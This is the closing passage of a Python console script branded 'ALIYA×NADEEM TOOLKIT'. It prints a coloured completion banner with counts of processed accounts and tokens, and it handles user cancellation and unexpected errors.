    print(f"{MAGENTA}{BOLD}║{' ' * 18}🎉 PROCESSING COMPLETE! 🎉{' ' * 18}║{RESET}")
    print(f"{MAGENTA}{BOLD}║{' ' * 12}✅ {successful} ACCOUNTS | {total_tokens} TOKENS ✅{' ' * 12}║{RESET}")
    print(f"{MAGENTA}{BOLD}║{' ' * 12}👑 ALIYA×NADEEM TOOLKIT 👑{' ' * 13}║{RESET}")
    print(f"{MAGENTA}{BOLD}╚{'═' * 60}╝{RESET}\n")
    
    input(f"{YELLOW}Press ENTER to exit...{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}{BOLD}❌ Operation cancelled by user{RESET}")
        time.sleep(1)
    except Exception as e:
        print(f"\n{RED}{BOLD}❌ Unexpected error: {str(e)}{RESET}")
        input(f"\n{YELLOW}Press ENTER to exit...{RESET}")
